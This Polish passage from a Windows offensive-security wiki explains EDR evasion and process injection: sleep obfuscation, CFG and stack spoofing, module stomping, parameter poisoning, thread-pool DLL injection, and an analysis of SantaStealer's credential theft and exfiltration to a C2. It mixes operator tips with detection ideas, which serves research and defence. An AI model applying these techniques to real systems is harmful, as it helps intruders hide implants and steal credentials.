Daje to **przekierowanie IAT podczas importu** bez patchowania sekcji kodu załadowanej DLL po jej załadowaniu.

### Wymuszanie importów, które można hookować, gdy cel używa PEB-walking

Hooki podczas importu uruchamiają się tylko wtedy, gdy funkcja rzeczywiście znajduje się w IAT celu. Jeśli moduł rozwiązuje API przez PEB-walk + hash (bez wpisu importu), wymuś rzeczywisty import, aby ścieżka `ProcessImports()` loadera go obsłużyła:

- Zastąp rozwiązywanie eksportu przez hash (np. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) bezpośrednim odwołaniem, takim jak `&WaitForSingleObject`.
- Kompilator wygeneruje wpis IAT, umożliwiając przechwycenie importu przez reflective loader.

### Obfuskacja uśpienia/bezczynności w stylu Ekko bez patchowania `Sleep()`

Zamiast patchować `Sleep`, hookuj **właściwe prymitywy oczekiwania/IPC** używane przez implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). W przypadku długiego oczekiwania opakuj wywołanie w łańcuch obfuskacji w stylu Ekko, który szyfruje obraz w pamięci podczas bezczynności:<sup>[[31]](#references)[[27]](#references)</sup>

- Użyj `CreateTimerQueueTimer`, aby zaplanować sekwencję callbacków wywołujących `NtContinue` z przygotowanymi ramkami `CONTEXT`.
- Typowy łańcuch (x64): ustaw obraz jako `PAGE_READWRITE` → zaszyfruj RC4 cały zmapowany obraz za pomocą `advapi32!SystemFunction032` → wykonaj blokujące oczekiwanie → odszyfruj RC4 → **przywróć uprawnienia poszczególnych sekcji**, przechodząc po sekcjach PE → zasygnalizuj zakończenie.
- `RtlCaptureContext` dostarcza szablon `CONTEXT`; sklonuj go do wielu ramek i ustaw rejestry (`Rip/Rcx/Rdx/R8/R9`), aby wywołać każdy etap.

Szczegół operacyjny: zwracaj „success” dla długiego oczekiwania (np. `WAIT_OBJECT_0`), aby kod wywołujący kontynuował działanie, gdy obraz jest zamaskowany. Ten wzorzec ukrywa moduł przed skanerami podczas okresów bezczynności i pozwala uniknąć charakterystycznego śladu klasycznego „patchowania `Sleep()`”.

Pomysły na detekcję (na podstawie telemetrii)
- Serie callbacków `CreateTimerQueueTimer` wskazujących na `NtContinue`.
- Użycie `advapi32!SystemFunction032` na dużych, ciągłych buforach o rozmiarze obrazu.
- `VirtualProtect` obejmujący duży zakres, po którym następuje niestandardowe przywracanie uprawnień poszczególnych sekcji.

### Rejestracja CFG w czasie wykonania dla gadżetów sleep-obfuscation

Na celach z włączonym CFG pierwszy pośredni skok do gadżetu ze środka funkcji, takiego jak `jmp [rbx]` lub `jmp rdi`, zwykle spowoduje awarię procesu z `STATUS_STACK_BUFFER_OVERRUN`, ponieważ gadżet nie znajduje się w metadanych CFG modułu. Aby łańcuchy w stylu Ekko/Kraken działały w utwardzonych procesach:<sup>[[30]](#references)</sup>

- Zarejestruj każdy pośredni cel używany przez łańcuch za pomocą `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` i wpisów `CFG_CALL_TARGET_VALID`.
- W przypadku adresów wewnątrz załadowanych obrazów (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` musi zaczynać się od **bazy obrazu** i obejmować **pełny rozmiar obrazu**.
- W przypadku ręcznie mapowanych obszarów/PIC/stomped użyj zamiast tego **bazy alokacji** i rozmiaru alokacji.
- Oznacz nie tylko gadżet dispatch, ale też eksporty osiągane pośrednio (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wywołania systemowe wait/event) oraz wszystkie wykonywalne sekcje kontrolowane przez atakującego, które będą pośrednimi celami.

Dzięki temu łańcuchy sleep w stylu ROP/JOP przestają „działać tylko w procesach bez CFG” i stają się wielokrotnego użytku w `explorer.exe`, przeglądarkach, `svchost.exe` i innych punktach końcowych skompilowanych z `/guard:cf`.

### CET-safe stack spoofing dla uśpionych wątków

Pełna podmiana `CONTEXT` jest widoczna i może powodować problemy w systemach z CET Shadow Stack, ponieważ spoofowany `Rip` musi nadal być zgodny ze sprzętowym shadow stack. Bezpieczniejszy wzorzec sleep-masking to:<sup>[[30]](#references)</sup>

- Wybierz inny wątek w tym samym procesie i odczytaj granice jego stosu `NT_TIB` / TEB (`StackBase`, `StackLimit`) za pomocą `NtQueryInformationThread`.
- Zapisz kopię bieżącego TEB/TIB wątku.
- Przechwyć rzeczywisty kontekst uśpionego wątku za pomocą `GetThreadContext`.
- Skopiuj **wyłącznie** rzeczywisty `Rip` do spoofowanego kontekstu, pozostawiając spoofowane `Rsp`/stan stosu bez zmian.
- Podczas uśpienia skopiuj `NT_TIB` spoofowanego wątku do bieżącego TEB, aby stack walkery rozwijały stos w prawidłowym zakresie.
- Po zakończeniu oczekiwania przywróć oryginalny TIB i kontekst wątku.

Zachowuje to zgodny z CET wskaźnik instrukcji, a jednocześnie wprowadza w błąd stack walkery EDR, które ufają metadanym stosu TEB podczas weryfikacji rozwijania stosu.

### Alternatywa oparta na APC: Kraken Mask

Jeśli dispatch z timer queue jest zbyt charakterystyczny, tę samą sekwencję sleep-encrypt-spoof-restore można wykonać z użyciem kolejkowanych APC w zawieszonym wątku pomocniczym:<sup>[[27]](#references)</sup>

- Utwórz wątek pomocniczy z `NtTestAlert` jako punktem wejścia.
- Umieść przygotowane ramki `CONTEXT`/APC w kolejce za pomocą `NtQueueApcThread` i opróżnij ją przez `NtAlertResumeThread`.
- Przechowuj stan łańcucha na heapie, a nie na stosie wątku, aby uniknąć wyczerpania domyślnego stosu wątku o rozmiarze 64 KB.
- Użyj `NtSignalAndWaitForSingleObject`, aby atomowo zasygnalizować zdarzenie startowe i zablokować działanie.
- Zawieś główny wątek przed przywróceniem TIB/kontekstu (`NtSuspendThread` → restore → `NtResumeThread`), aby zmniejszyć okno wyścigu, w którym skaner mógłby przechwycić częściowo przywrócony stos.

Zastępuje to charakterystyczną sekwencję `CreateTimerQueueTimer` + `NtContinue` sekwencją helper-thread/APC, zachowując te same cele RC4 masking i stack-spoofing.

Dodatkowe pomysły na detekcję
- `NtSetInformationVirtualMemory` z `VmCfgCallTargetInformation` krótko przed uśpieniem, oczekiwaniem lub dispatch APC.
- `GetThreadContext`/`SetThreadContext` używane wokół `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` lub `ConnectNamedPipe`.
- `NtQueryInformationThread`, po którym następują bezpośrednie zapisy do granic stosu TEB/TIB bieżącego wątku.
- Łańcuchy `NtQueueApcThread`/`NtAlertResumeThread` pośrednio prowadzące do `SystemFunction032`, `VirtualProtect` lub funkcji pomocniczych przywracających uprawnienia sekcji.
- Powtarzające się użycie krótkich sygnatur gadżetów, takich jak `FF 23` (`jmp [rbx]`) lub `FF E7` (`jmp rdi`), jako punktów przestawienia dispatch wewnątrz podpisanych modułów.


## Precision Module Stomping

Module stomping wykonuje payloady z **sekcji `.text` DLL już zmapowanej w procesie docelowym**, zamiast alokować oczywistą prywatną pamięć wykonywalną lub ładować nową poświęcaną DLL. Celem nadpisania powinien być **załadowany obraz oparty na pliku dyskowym**, którego obszar kodu pomieści payload bez uszkadzania ścieżek kodu, których proces nadal potrzebuje.<sup>[[1]](#references)[[2]](#references)</sup>

### Niezawodny wybór celu

Naiwne stomping typowych modułów, takich jak `uxtheme.dll` lub `comctl32.dll`, jest zawodne: DLL może nie być załadowana w zdalnym procesie, a zbyt mały obszar kodu może spowodować awarię procesu. Bardziej niezawodny przebieg pracy:

1. Wylicz moduły procesu docelowego i zachowaj **listę dozwolonych nazw DLL**, które są już załadowane.
2. Najpierw zbuduj payload i zapisz jego **dokładny rozmiar w bajtach**.
3. Przeskanuj kandydackie DLL-e na dysku i porównaj rozmiar sekcji PE **`.text` `Misc_VirtualSize`** z rozmiarem payloadu. To ważniejsze niż rozmiar pliku, ponieważ odzwierciedla rozmiar sekcji wykonywalnej **po zmapowaniu w pamięci**.
4. Przeanalizuj **Export Address Table (EAT)** i wybierz RVA eksportowanej funkcji jako początkowy offset stomp.
5. Oblicz **blast radius**: jeśli payload przekracza granicę wybranej funkcji, nadpisze sąsiednie eksporty rozmieszczone za nią w pamięci.

Typowe narzędzia pomocnicze do rekonesansu i wyboru celu spotykane w praktyce:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Uwagi operacyjne
- Preferuj DLL-e **już załadowane** do zdalnego procesu, aby uniknąć telemetryki `LoadLibrary`/nieoczekiwanych załadowań obrazów.
- Preferuj eksporty, które aplikacja docelowa rzadko wykonuje; w przeciwnym razie zwykłe ścieżki kodu mogą trafić na nadpisane bajty przed utworzeniem wątku lub po nim.
- Duże implanty często wymagają zmiany sposobu osadzania shellcode’u z literału tekstowego na **tablicę bajtów/inicjalizator w nawiasach klamrowych**, aby cały bufor został prawidłowo odwzorowany w kodzie źródłowym injectora.

Pomysły na wykrywanie
- Zdalne zapisy do stron wykonywalnych mapowanych z obrazu (`MEM_IMAGE`, `PAGE_EXECUTE*`), zamiast do częściej spotykanych prywatnych alokacji RWX/RX.
- Punkty wejścia eksportów, których bajty w pamięci nie są już zgodne z plikiem źródłowym na dysku.
- Zdalne wątki lub przestawienia kontekstu, które rozpoczynają wykonywanie wewnątrz eksportu z legalnej DLL, którego pierwsze bajty zostały niedawno zmodyfikowane.
- Podejrzane sekwencje `VirtualProtect(Ex)` / `WriteProcessMemory` dotyczące stron `.text` DLL, po których następuje utworzenie wątku.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) to technika **wstrzykiwania do procesu / omijania EDR**, która pozwala uniknąć klasycznej ścieżki zdalnego zapisu (`VirtualAllocEx` + `WriteProcessMemory`). Zamiast kopiować bajty do już uruchomionego procesu docelowego, wykorzystuje fakt, że Windows **kopiuje wybrane parametry startowe `CreateProcessW` do procesu potomnego** i przechowuje je w `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Nośniki podatne na zatruwanie, kopiowane przez `CreateProcessW`

Przydatne nośniki to:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (z `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Ograniczenia praktyczne dotyczące nośników:

- `lpCommandLine` musi wskazywać na **pamięć z możliwością zapisu** dla `CreateProcessW`, a jego długość jest ograniczona do **32,767 znaków Unicode**, łącznie z terminatorem null.
- `lpEnvironment` musi być blokiem środowiska Unicode złożonym z kolejnych ciągów `NAME=VALUE\0`, zakończonym dodatkowym `\0`.
- `lpReserved` jest oficjalnie zarezerwowane, dlatego mapowanie `ShellInfo` należy traktować jako szczegół implementacyjny, a nie stabilną, udokumentowaną umowę.

Dzięki temu zwykłe tworzenie procesu staje się **prymitywem do przesyłania payloadu**. Operator tworzy proces potomny z kontrolowanymi przez atakującego danymi startowymi i pozwala Windows wykonać kopię międzyprocesową.

### Przepływ zdalnego wyszukiwania bez zdalnych API zapisu

Po utworzeniu procesu potomnego rozwiąż adres skopiowanego bufora za pomocą prymitywów **tylko do odczytu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pobierz `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Odczytaj zdalny `PEB`
3. Podążaj za `PEB.ProcessParameters`
4. Odczytaj `RTL_USER_PROCESS_PARAMETERS`
5. Użyj wybranego wskaźnika:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimalny przepływ:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Wykonywanie skopiowanego bufora parametrów

Skopiowany obszar parametrów ma zwykle uprawnienia `RW`, a nie jest wykonywalny. Typowy łańcuch P3 wygląda tak:

1. Utwórz proces normalnie (nie jako zawieszony)
2. Nadaj wybranej stronie parametrów uprawnienia do wykonywania za pomocą `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Ponownie użyj uchwytu głównego wątku zwróconego już w `PROCESS_INFORMATION`
4. Przekieruj wykonanie za pomocą `NtSetContextThread` (`CONTEXT_CONTROL`, nadpisz `RIP`)

W przeciwieństwie do klasycznych metod przejmowania wątku, **nie jest wymagane** użycie `SuspendThread` / `ResumeThread`; kontekst można zmienić bezpośrednio na zwróconym uchwycie głównego wątku.

Pozwala to uniknąć kilku API często monitorowanych pod kątem injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- często także `SuspendThread` / `ResumeThread`

### Ograniczenie związane z bajtem null i etapowy shellcode

Wszystkie trzy nośniki to **dane tekstowe lub podobne do tekstowych**, więc surowy payload zawierający `0x00` zostaje obcięty podczas przesyłania. Praktycznym rozwiązaniem jest **pierwszy etap bez bajtów null**, który odtwarza stałe w czasie działania, a następnie ładuje dowolny drugi etap.

Prosty schemat polega na syntezie stałych opartej na XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Dzięki temu pierwszy etap może budować na stosie ciągi znaków, argumenty API, ścieżki DLL lub loader shellcode drugiego etapu bez umieszczania bajtów null w przesyłanym parametrze.

### Wywołania API oparte na stosie z pierwszego etapu

Gdy pierwszy etap musi wywołać API, takie jak `LoadLibraryA`, może:

- umieścić ciąg/bufor na stosie procesu docelowego
- zarezerwować **32-bajtową przestrzeń shadow space x64**
- ustawić `RCX`, `RDX`, `R8`, `R9` na stałe wartości lub wskaźniki względem `RSP`
- zachować **16-bajtowe wyrównanie** `RSP` przed wywołaniem

Drugi etap można następnie skopiować ze stosu do alokacji `PAGE_READWRITE`, zmienić jej ochronę na `PAGE_EXECUTE_READ` za pomocą `VirtualProtect` i wykonać skok do tego obszaru, unikając bezpośredniej alokacji RWX.

### Pomysły na wykrywanie

Dobre możliwości wykrywania wskazane przez autorów:

- `VirtualProtectEx` / `NtProtectVirtualMemory` nadające **stronom parametrów procesu uprawnienia do wykonywania**
- zmiana tych uprawnień, po której następuje `SetThreadContext` / `NtSetContextThread`
- odczyty zdalne `PEB`, a następnie `RTL_USER_PROCESS_PARAMETERS`
- nietypowo długie wartości lub wartości o wysokiej entropii w `lpCommandLine`, `lpEnvironment` lub `STARTUPINFO.lpReserved` podczas tworzenia procesu

### Uwagi

- P3 to **sztuczka transferu między procesami**, a nie samodzielny, pełny mechanizm wykonywania: skopiowany parametr nadal wymaga zmiany uprawnień na wykonywanie oraz metody przekierowania wykonania.
- Autorzy rozważali `RtlCreateProcessReflection` / Dirty Vanity, ale odrzucili tę metodę, ponieważ wewnętrznie korzysta z podejrzanych prymitywów, takich jak `NtWriteVirtualMemory` i `NtCreateThreadEx`.

## Wstrzykiwanie przez potok STDIN konsoli

Interaktywny proces potomny z konsolą może również służyć jako **prymityw transferu payloadu**. Injector przekierowuje standardowe wejście procesu potomnego do potoku i wysyła znacznik, a następnie shellcode. Gdy program konsolowy odczyta dane do własnej, prywatnej pamięci, injector znajduje ten bufor, nadaje mu uprawnienia do wykonywania i przekierowuje do niego wątek procesu potomnego. Pozwala to uniknąć `VirtualAllocEx` i `WriteProcessMemory`, ale nadal jest to wstrzykiwanie do procesu, a nie ogólna metoda obejścia EDR.<sup>[[41]](#references)</sup>

Mimo określenia „named-pipe” implementacja referencyjna wywołuje `CreatePipe`, które tworzy **potok anonimowy**. Windows implementuje potoki anonimowe przy użyciu wewnętrznych obiektów potoków o unikatowych nazwach, ale PoC nie wybiera ścieżki `\\.\pipe\<name>` ani nie wywołuje `CreateNamedPipe`. Tworzy dziedziczone uchwyty z domyślnym deskryptorem zabezpieczeń, umieszcza uchwyt do odczytu w `STARTUPINFO.hStdInput`, ustawia `STARTF_USESTDHANDLES` i uruchamia nowy proces potomny z włączonym dziedziczeniem uchwytów. Dlatego ten PoC uruchamia podany plik wykonywalny konsoli; nie podłącza potoku do istniejącego procesu.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referencyjny przebieg działania

Implementacja korzysta z następującego łańcucha:<sup>[[41]](#references)</sup>

1. Utwórz pary anonimowych potoków dla `STDIN` i `STDOUT` procesu potomnego. Wyłącz dziedziczenie dla dwóch uchwytów po stronie procesu nadrzędnego i zamknij w procesie nadrzędnym duplikaty uchwytów po stronie procesu potomnego po utworzeniu procesu.
2. Uruchom interaktywny plik wykonywalny, taki jak `netsh.exe` lub `nslookup.exe`, z flagą `CREATE_NEW_CONSOLE`. Proces potomny dziedziczy przekierowane standardowe uchwyty.
3. Wyślij całą tablicę binarną `rawData` za pomocą `WriteFile` przez uchwyt `STDIN` po stronie procesu nadrzędnego. Program konsolowy odczytuje bajty i pozostawia ich kopię w jednym ze swoich prywatnych, zatwierdzonych obszarów pamięci.
4. Przejdź przez przestrzeń adresową procesu potomnego za pomocą `VirtualQueryEx`, odczytaj potencjalne obszary `MEM_PRIVATE` przy użyciu `ReadProcessMemory` i wyszukaj znacznik na początku `rawData`.
5. Zmień ochronę odnalezionego bufora na `PAGE_EXECUTE_READWRITE` za pomocą `VirtualProtectEx`.
6. Zidentyfikuj główny wątek, zawieś go, ustaw `RIP` na `found_address + 0x19` za pomocą `NtSetContextThread`, a następnie wznów jego działanie.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Dostarczona implementacja jest przeznaczona wyłącznie dla x64: modyfikuje `CONTEXT.Rip`, a osadzony payload to shellcode x64. `rawData` zaczyna się od 25-bajtowego znacznika, więc wykonywalne bajty zaczynają się pod offsetem szesnastkowym `0x19`. Przy zastępowaniu payloadu zachowaj ten układ lub zaktualizuj jednocześnie znacznik, wektor wyszukiwania, rozmiar tablicy i offset wykonania. Komentarze w kodzie źródłowym wymieniają również `0x0A`, `0x0D` i `0x1A` jako niedozwolone znaki. Ten workflow nie zmienia tokenu ani uprawnień procesu potomnego.<sup>[[41]](#references)</sup>

Informacje o małych natywnych helperach i wzorcach kompilacji payloadów znajdziesz w [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Iniekcja DLL przez callback thread-pool bez shellcode (DLLParty)

DLLParty dostosowuje iniekcję do thread-poola w stylu PoolParty, aby istniejący worker procesu docelowego wywołał `LoadLibraryA`, zamiast wykonywać wstrzyknięty stub callbacku. Prymitywem dyspozycji jest `TP_DIRECT` umieszczony w kolejce portu I/O completion docelowego poola. Nie omija to uprawnień procesu: PoC wywołuje `OpenProcess(PROCESS_ALL_ACCESS)` i wymaga możliwości odczytu i zapisu pamięci procesu docelowego oraz duplikowania uchwytów worker-factory i portu completion.<sup>[[46]](#references)[[47]](#references)</sup>

W Windows x64 worker przekazuje wskaźnik do opartego na stosie `TP_CALLBACK_INSTANCE` w `RCX`, czyli pierwszym argumencie callbacku. `LoadLibraryA` interpretuje ten sam wskaźnik jako `LPCSTR`. Na testowanej ścieżce `TppWorkerThread` tworzy wskaźnik pod `RSP+0x178`, a pierwszy zwykły zapis do tego obiektu wykonuje pod `RSP+0x1d0`. Dlatego zakończona znakiem null ścieżka do DLL, która mieści się w tym prefiksie o długości 0x58 bajtów, może znaleźć się na początku instancji i nie zostać nadpisana przed wywołaniem. To obserwacja dotycząca konkretnej kompilacji, a nie udokumentowana gwarancja ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Referencyjny workflow wygląda następująco:<sup>[[46]](#references)[[47]](#references)</sup>

1. Wylicz uchwyty procesu docelowego za pomocą `NtQuerySystemInformation(SystemHandleInformation)` i zidentyfikuj `TpWorkerFactory`, odpytując typy obiektów. Zduplikuj uchwyt worker-factory i pobierz `WorkerFactoryBasicInformation`; `StartParameter` wskazuje zdalny `TP_POOL`. Pomiń fabryki, dla których `TotalWorkerCount == 0`.
2. Odczytaj `TP_POOL.CompletionPort` i przejdź po prywatnej liście workerów poola. W testowanej kompilacji Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) jej początek znajduje się pod `pool+0x60`; każde łącze znajduje się pod `worker+0x10`, więc slot instancji callbacku pod `worker+0x38` jest równy `link+0x28`. PoC sprawdza wyrównanie wskaźników, wzajemność łączy, przynależność do poola, niezerowe identyfikatory wątków, powtarzające się węzły i stabilność początku listy.
3. Zapisz ścieżkę do DLL w **każdym** odzyskanym slocie workera, ponieważ zakolejkowane completion może zostać pobrane przez dowolnego workera. Umieść `TP_DIRECT` z `Callback = LoadLibraryA` w zapisywalnej pamięci procesu docelowego. PoC używa `last_slot-0x500` na stosie workera zamiast `VirtualAllocEx`; ten offset jest eksperymentalny i nie może kolidować z aktywnymi danymi stosu.
4. Zduplikuj uchwyt portu completion procesu docelowego i wywołaj `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Adres zdalnego `TP_DIRECT` jest kluczem completion. Istniejący worker wywołuje następnie `LoadLibraryA` z nadpisanym wskaźnikiem instancji callbacku, ładując DLL, do której proces docelowy ma już dostęp.

PoC przyjmuje PID procesu docelowego (`DLLParty.exe <target_pid>`) i używa ścieżki do DLL wpisanej na stałe w `DLLParty.cpp`; przed zbudowaniem pliku wykonywalnego x64 ustaw ścieżkę dostępną dla procesu docelowego. Używa też adresu `LoadLibraryA` z własnego procesu jako zdalnego callbacku, zakładając, że ten adres jest prawidłowy w procesie docelowym. Kod nie sprawdza długości ścieżki względem prefiksu 0x58 bajtów ani tego, czy przejście po workerach znalazło slot przed indeksowaniem ostatniego elementu. Zweryfikuj ponownie prywatne offsety, układ stosu i dostępną pamięć do zapisu dla docelowej kompilacji. Pominięcie `CreateRemoteThreadEx`, shellcode i `VirtualAllocEx` nie eliminuje zapisów między procesami ani telemetrii ładowania DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Taktyki SantaStealer w zakresie fileless evasion i kradzieży poświadczeń

SantaStealer (znany też jako BluelineStealer) pokazuje, jak współczesne info-stealery łączą AV bypass, anti-analysis i dostęp do poświadczeń w jednym workflow.<sup>[[24]](#references)</sup>

### Kontrola układu klawiatury i opóźnienie sandboxa

- Flaga konfiguracji (`anti_cis`) wylicza zainstalowane układy klawiatury za pomocą `GetKeyboardLayoutList`. Jeśli wykryty zostanie układ cyrylicki, próbka tworzy pusty znacznik `CIS` i kończy działanie przed uruchomieniem stealerów, dzięki czemu nie uruchamia się w wykluczonych lokalizacjach, pozostawiając jednocześnie artefakt przydatny podczas wyszukiwania.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Warstwowa logika `check_antivm`

- Wariant A przegląda listę procesów, oblicza dla każdej nazwy własną sumę kontrolną z funkcją mieszającą i porównuje ją z osadzonymi listami blokowanych nazw debuggerów/sandboxów; ponownie oblicza sumę kontrolną dla nazwy komputera i sprawdza katalogi robocze, takie jak `C:\analysis`.
- Wariant B sprawdza właściwości systemu (minimalną liczbę procesów, niedawny czas działania), wywołuje `OpenServiceA("VBoxGuest")`, aby wykryć dodatki VirtualBox, oraz wykonuje testy czasu wokół uśpienia, by wykryć single-stepping. Każde wykrycie powoduje przerwanie działania przed uruchomieniem modułów.

### Pomocnik fileless + podwójne ładowanie refleksyjne ChaCha20

- Główny plik DLL/EXE zawiera osadzony pomocnik do pozyskiwania danych logowania z Chromium, który jest zapisywany na dysku albo ręcznie mapowany w pamięci; w trybie fileless samodzielnie rozwiązuje importy i relokacje, dzięki czemu nie powstają żadne artefakty pomocnika.
- Ten pomocnik przechowuje bibliotekę DLL drugiego etapu zaszyfrowaną dwukrotnie za pomocą ChaCha20 (dwa klucze 32-bajtowe i dwa 12-bajtowe nonce). Po obu etapach odszyfrowywania refleksyjnie ładuje blob (bez `LoadLibrary`) i wywołuje eksporty `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` pochodzące z [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Procedury ChromElevator używają refleksyjnego process hollowing opartego na bezpośrednich wywołaniach syscall, aby wstrzyknąć kod do działającej przeglądarki Chromium, przejąć klucze AppBound Encryption i odszyfrować hasła, pliki cookie oraz dane kart kredytowych bezpośrednio z baz danych SQLite mimo zabezpieczeń ABE.

### Modułowe zbieranie danych w pamięci i eksfiltracja HTTP w częściach

- `create_memory_based_log` iteruje po globalnej tablicy wskaźników funkcji `memory_generators` i uruchamia po jednym wątku dla każdego włączonego modułu (Telegram, Discord, Steam, zrzuty ekranu, dokumenty, rozszerzenia przeglądarek itd.). Każdy wątek zapisuje wyniki do współdzielonych buforów i po około 45-sekundowym oczekiwaniu na zakończenie raportuje liczbę plików.
- Po zakończeniu całość jest pakowana do archiwum ZIP za pomocą statycznie linkowanej biblioteki `miniz` i zapisywana jako `%TEMP%\\Log.zip`. Następnie `ThreadPayload1` czeka 15 sekund i przesyła archiwum w częściach po 10 MB przez HTTP POST na adres `http://<C2>:6767/upload`, podszywając się pod granicę `multipart/form-data` przeglądarki (`----WebKitFormBoundary***`). Każda część zawiera nagłówki `User-Agent: upload`, `auth: <build_id>` i opcjonalnie `w: <campaign_tag>`, a w ostatniej części dodawany jest nagłówek `complete: true`, aby C2 wiedział, że składanie archiwum zostało zakończone.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
